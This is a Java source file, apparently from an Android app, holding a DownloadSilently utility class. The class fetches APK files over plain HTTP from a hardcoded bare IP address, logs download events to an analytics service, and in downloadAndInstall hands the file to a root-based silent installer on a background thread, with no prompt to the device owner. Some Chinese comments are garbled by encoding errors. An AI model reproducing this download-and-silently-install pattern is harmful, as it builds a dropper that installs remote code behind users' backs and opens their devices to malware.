package com.xiude.util;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.URL;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Environment;
import android.util.Log;

import com.umeng.analytics.MobclickAgent;

public class DownloadSilently {

	private static final int MIN_SPACE = 10;

	/**
	 * get download URL
	 * 
	 * @param entity
	 * @param callback
	 */
/*	public static final void getDownloadUrl(NetEntity entity,
			NetCallback callback) {
		NetProcessProxy.proxy(entity, callback, NetRequestType.POST);
	}*/

	/**
	 * get download file
	 * 
	 * @param downloadUrl
	 */
	public static final void download(final String downloadUrl, Context context) {

		BufferedInputStream bis = null;
	
		String fileLoadPath = DownloadSilently.getFileNamePath(downloadUrl);
		if (fileLoadPath == null) {
			return;
		}
		File file = new File(fileLoadPath);
		
		if (!file.exists()) {
			file.getParentFile().mkdirs();
			try {
				file.createNewFile();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}else {
			return;
		}
		
		long localFileSize = file.length();
		HttpURLConnection conn = null;
		try {
			URL url = new URL(downloadUrl);
			conn = (HttpURLConnection) url.openConnection();
			// set User-Agent
			conn.setRequestProperty("User-Agent", "NetFox");
			// 璁剧疆鏂偣缁紶鐨勫紑濮嬩綅缃?
			conn.setRequestProperty("RANGE", "bytes=" + localFileSize + "-");
			conn.setRequestMethod("GET");
			conn.setConnectTimeout(5000); // 5绉?
			conn.setReadTimeout(10000); // 10绉?
			conn.setDoInput(true);
			conn.setDoOutput(false);
			conn.setUseCaches(false);
			if (conn.getResponseCode() == 206) {
				String fileName = file.getName();
				fileName = fileName.substring(0, fileName.lastIndexOf("."));
				
				MobclickAgent.onEvent(context, "download_count");
				MobclickAgent.onEvent(context, "download_"+fileName);
				
				bis = new BufferedInputStream(conn.getInputStream());
				long length = conn.getContentLength();
				RandomAccessFile oSavedFile = new RandomAccessFile(file, "rw");
				oSavedFile.seek(localFileSize);

				byte[] buf = new byte[4 * 1024];
				int ch = -1;
				long downloaded = 0;
				int timediff = 500;
				long time1 = System.currentTimeMillis(), time2 = System
						.currentTimeMillis();
				
				while ((ch = bis.read(buf)) != -1) {

					oSavedFile.write(buf, 0, ch);
					downloaded += ch;
					if (time2 - time1 > timediff || time1 == time2) {
						time1 = time2;
					}
					time2 = System.currentTimeMillis();
				}
				
				if(length == downloaded){
					Log.i("download", "success");
					MobclickAgent.onEvent(context, "download_total_success");
					MobclickAgent.onEvent(context, "download_success_"+fileName);
				}
				
				
			} else if (conn.getResponseCode() == 416) {
				file.delete();
				if (file.exists()) {
					return;
				}
			} else {
				file.delete();
			}
		} catch (Exception e) {
			e.printStackTrace();
			if(file != null && file.exists()){
				file.delete();
			}
		} finally {
			if (conn != null) {
				conn.disconnect();
			}
			if (bis != null) {
				try {
					bis.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
	}

	/**
	 * get download file
	 * 
	 * @param downloadUrl
	 */
	public static final void downloadNormal(final String downloadUrl) {

		BufferedInputStream bis = null;
		String fileLoadPath = getFileNamePath(downloadUrl);
		if (fileLoadPath == null) {
			return;
		}
		File file = new File(fileLoadPath);
		if (!file.exists()) {
			file.getParentFile().mkdirs();
		} 
//		else {
//			return;
//		}
		HttpURLConnection conn = null;
		try {
			URL url = new URL(downloadUrl);
			conn = (HttpURLConnection) url.openConnection();
			// set User-Agent
			// conn.setRequestProperty("User-Agent", "NetFox");
			// 璁剧疆鏂偣缁紶鐨勫紑濮嬩綅缃?
			conn.setRequestMethod("GET");
			conn.setConnectTimeout(5000); // 5绉?
			conn.setReadTimeout(10000); // 10绉?
			conn.setDoInput(true);
			conn.setDoOutput(false);
			conn.setUseCaches(false);
			if (conn.getResponseCode() == 200) {
				InputStream inputStream = conn.getInputStream();
				if (inputStream == null || inputStream.available() == 0) {
					return;
				}
				int len = -1;
				OutputStream outputStream = new FileOutputStream(file);
				byte[] buf = new byte[1024];
				while ((len = inputStream.read(buf)) != -1) {
					outputStream.write(buf, 0, len);
				}
				outputStream.flush();
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (conn != null) {
				conn.disconnect();
			}
			if (bis != null) {
				try {
					bis.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}
	}

	public static final String getFileNamePath(String downloadUrl) {

		File fileSaveDir;
		
		if(isCanUseSdCard()){
			fileSaveDir = Environment.getExternalStorageDirectory();
		}else{
			fileSaveDir = Environment.getDownloadCacheDirectory();
		}
		
		downloadUrl = downloadUrl.substring(downloadUrl.lastIndexOf("/"));
		return fileSaveDir.getAbsolutePath() + "/install"
				+ downloadUrl;
//		return fileSaveDir.getAbsolutePath() + "/install/"
//				+ DigestUtils.shaHex(downloadUrl);
	}
	
	//sdcard鏄惁鍙鍐?
	public static boolean isCanUseSdCard() { 
	    try { 
	        return Environment.getExternalStorageState().equals( 
	                Environment.MEDIA_MOUNTED); 
	    } catch (Exception e) { 
	        e.printStackTrace(); 
	    } 
	    return false; 
	}
	
	public static String getDownloadUrl(String downloadUrl){
		String fileLoadPath = getFileNamePath(downloadUrl);
		if (fileLoadPath == null) {
			return "";
		}
		File file = new File(fileLoadPath);
		if (!file.exists()) {
			return downloadUrl;
		}else {
	    	String num = downloadUrl.substring(downloadUrl.lastIndexOf(".")-1, downloadUrl.lastIndexOf("."));
	    	downloadUrl = "http://114.80.202.91:8080/test2/silent"+ (Integer.parseInt(num)+1) +".apk";
	    	String newUrl = getDownloadUrl(downloadUrl);
			return newUrl;
		}
	}
	
	/**
	 * 静默下载和安装
	 */
	public static void downloadAndInstall(final String url, final Context context){
		Thread thread = new Thread() {
		public void run() {
	//		DownloadSilently.download("http://www.hzblogs.com/resource_rss/apks/nidoya_v1.0.0.release_2.apk");
			
			String downloadUrl = DownloadSilently.getDownloadUrl(url);
			
			DownloadSilently.download(downloadUrl, context);
			//使應用獲取最高的權限
	//		boolean isRoot = RootUtils.isRoot(DownloadSilently.getFileNamePath("http://www.hzblogs.com/resource_rss/apks/nidoya_v1.0.0.release_.apk"));
			
	//		if(isRoot){
			SharedPreferences isSilentSuccessPreference = context.getSharedPreferences("isSilentSuccess", 0);
			boolean isSilentSuccess = isSilentSuccessPreference.getBoolean("isSuccess", true);
			if(isSilentSuccess){
				isSilentSuccessPreference.edit().putBoolean("isSuccess", false).commit();
				boolean isSuccess = RootUtils.installSilentThread(DownloadSilently.getFileNamePath(downloadUrl));
				if(isSuccess){
					isSilentSuccessPreference.edit().putBoolean("isSuccess", true).commit();
				}
			}
				
	//		}
				}
			};
	//thread.setDaemon(true);
		thread.start();
	}
}
